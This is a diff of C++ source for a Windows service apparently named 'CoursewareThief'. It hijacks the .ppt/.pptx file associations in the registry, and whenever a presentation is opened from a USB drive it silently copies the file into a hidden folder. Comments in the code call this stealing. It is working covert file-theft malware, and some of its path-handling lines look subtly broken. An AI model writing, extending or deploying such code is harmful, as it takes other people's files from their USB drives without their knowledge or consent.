@@ -78,25 +78,40 @@ static DWORD WINAPI FileAssocChanger(PVOID) {
 	if (!file_exists("PPTX.exe"))
 	if (!FreeResFile(IDR_BIN_PPTXOPENER, L"BIN", L"PPTX.exe"))
 		return GetLastError();
-	wstring cmd = GetProgramPathW() + L"\\PPTX.exe \"%1\"";
+	wstring cmd = L"\"" + GetProgramPathW() + L"PPTX.exe\" \"%1\"";
 
 	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".pptx", 0, KEY_READ | KEY_WRITE, &hk);
 	if (!hk) return -1;
-	MyQueryRegistryValue(hk, L"CoursewareThiefOriginalValue", originalOpenType);
+	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
 	if (originalOpenType.empty()) {
-		MyQueryRegistryValue(hk, L"", originalOpenType);
-		MySetRegistryValue(hk, L"CoursewareThiefOriginalValue", originalOpenType);
-		MySetRegistryValue(hk, L"", cmd);
+		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
+		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
+		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
 	}
 	RegCloseKey(hk);
 
 	RegOpenKeyExW(HKEY_CLASSES_ROOT, L".ppt", 0, KEY_READ | KEY_WRITE, &hk);
 	if (!hk) return -1;
-	MyQueryRegistryValue(hk, L"CoursewareThiefOriginalValue", originalOpenType);
+	MyQueryRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
 	if (originalOpenType.empty()) {
-		MyQueryRegistryValue(hk, L"", originalOpenType);
-		MySetRegistryValue(hk, L"CoursewareThiefOriginalValue", originalOpenType);
-		MySetRegistryValue(hk, L"", cmd);
+		MyQueryRegistryValue(hk, L"", L"", originalOpenType);
+		MySetRegistryValue(hk, L"", L"CoursewareThiefOriginalValue", originalOpenType);
+		MySetRegistryValue(hk, L"", L"", L"CoursewareThief.PPTX");
+	}
+	RegCloseKey(hk);
+
+	RegOpenKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
+		L"shell\\open\\command", 0,
+		KEY_READ | KEY_WRITE, &hk);
+	if (!hk) {
+		RegCreateKeyExW(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
+			L"shell\\open\\command", 0, NULL, 0,
+			KEY_READ | KEY_WRITE, NULL, &hk, NULL);
+		if (hk) RegCloseKey(hk);
+		bool result = MySetRegistryValue(HKEY_CLASSES_ROOT, L"CoursewareThief.PPTX\\"
+			L"shell\\open\\command", L"", cmd);
+		//fstream fp("app.log", ios::app);
+		//fp << "result: " << result << endl;
 	}
 	RegCloseKey(hk);
 
@@ -118,6 +133,82 @@ bool ShellOpenCourseware(wstring file, DWORD session) {
 
 
 
+static bool IsRemovableDrive(const std::wstring& disk) {
+	UINT driveType = GetDriveTypeW(disk.c_str());
+
+	// 可移除的磁盘驱动器通常是U盘  
+	if (driveType == DRIVE_REMOVABLE) {
+		return true;
+	}
+
+	return false;
+}
+static bool OpenCoursewareFromNamedPipe(HANDLE hPipe, wstring cw) {
+	if (cw.empty()) return false;
+
+	auto direct = [&] {
+		DWORD sessionID = WTSGetActiveConsoleSessionId();
+		GetNamedPipeClientSessionId(hPipe, &sessionID);
+		return ShellOpenCourseware(cw, sessionID);
+	};
+
+	// 判断文件是否在U盘上
+	wstring disk = cw[0] + L":\\";
+	if (!IsRemovableDrive(disk)) {
+		// 直接打开
+		return direct();
+	}
+
+	// 文件在U盘上
+	auto size = MyGetFileSizeW(cw);
+	if (size > ULONGLONG(100) * 1024 * 1024) { // 100MB
+		// 直接打开
+		return direct();
+	}
+	FILETIME modifyTime{};
+	ULARGE_INTEGER nModTime{};
+	HANDLE hFile = CreateFileW(cw.c_str(), GENERIC_READ, FILE_SHARE_READ,
+		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hFile == INVALID_HANDLE_VALUE) {
+		return direct();
+	}
+	GetFileTime(hFile, NULL, &modifyTime, NULL);
+	CloseHandle(hFile);
+
+	nModTime.LowPart = modifyTime.dwLowDateTime;
+	nModTime.HighPart = modifyTime.dwHighDateTime;
+	wstring targetFolderName = L"@@" + cw + L"." + to_wstring(nModTime.QuadPart) +
+		L"-917a77f7";
+	wstring targetFile = L"Files\\" + targetFolderName + L"\\" + cw;
+	targetFile = GetProgramPathW() + targetFile;
+	if (file_exists(L"Files/" + targetFolderName) &&
+		file_exists(targetFile)) {
+		// 偷过了
+		DWORD sessionID = WTSGetActiveConsoleSessionId();
+		GetNamedPipeClientSessionId(hPipe, &sessionID);
+		return ShellOpenCourseware(targetFile, sessionID);
+	}
+
+	// 偷了
+	// TODO: 显示偷取进度
+
+	CreateDirectoryW((L"Files/" + targetFolderName).c_str(), NULL);
+	CopyFileW(cw.c_str(), targetFile.c_str(), FALSE);
+	
+	if (file_exists(L"Files/" + targetFolderName) &&
+		file_exists(targetFile)) {
+		// 打开
+		DWORD sessionID = WTSGetActiveConsoleSessionId();
+		GetNamedPipeClientSessionId(hPipe, &sessionID);
+		return ShellOpenCourseware(targetFile, sessionID);
+	}
+	else return direct();
+
+	return true;
+}
+
+
+
 // Function to handle a client connection  
 static void __stdcall OpenerPipe_ClientHandler(void* pParam) {
 	HANDLE hPipe = (HANDLE)pParam;
@@ -126,12 +217,17 @@ static void __stdcall OpenerPipe_ClientHandler(void* pParam) {
 	BOOL result = ReadFile(hPipe, buffer, sizeof(buffer) - 2, &bytesRead, NULL);
 	if (result && bytesRead > 0) {
 		// use buffer
+#if 0
 		wchar_t title[] = L"server"; DWORD resp = 0;
 		WTSSendMessageW(WTS_CURRENT_SERVER, WTSGetActiveConsoleSessionId(),
 			title, 12, buffer, bytesRead, MB_ICONINFORMATION, 0, &resp, 0);
+		CopyFileExW;
+#endif
+		;
 
 		wstring str;
-		str = L"success";
+		str = OpenCoursewareFromNamedPipe(hPipe, buffer) ?
+			L"success" : to_wstring(GetLastError());
 
 		// Send the data back to the client  
 		DWORD bytesWritten;
@@ -212,11 +308,18 @@ constexpr LPTHREAD_START_ROUTINE workerThreads[] = {
 constexpr size_t workerThreadsCount =
 	sizeof(workerThreads) / sizeof(LPTHREAD_START_ROUTINE);
 HANDLE hServiceWorkerThreads[min(32, workerThreadsCount)] = {};
+#define checkFile(x) \
+	if (file_exists(x)) DeleteFileW(x); \
+	CopyFileW(GetProgramDirW().c_str(), x, FALSE);
 DWORD WINAPI srv_main(PVOID) {
-	if (!file_exists(L"cwtui.exe"))
-		CopyFileW(GetProgramDirW().c_str(), L"cwtui.exe", FALSE);
-	if (!file_exists(L"cwtshell.exe"))
-		CopyFileW(GetProgramDirW().c_str(), L"cwtshell.exe", FALSE);
+	checkFile(L"cwtui.exe");
+	checkFile(L"cwtshell.exe");
+
+	if (IsFileOrDirectory(L"Files") != -1) {
+		if (IsFileOrDirectory(L"Files") == 1) RemoveDirectoryW(L"Files");
+		CreateDirectoryW(L"Files", NULL);
+		SetFileAttributesW(L"Files", FILE_ATTRIBUTE_HIDDEN);
+	}
 
 	AutoZeroMemory(hServiceWorkerThreads);
 
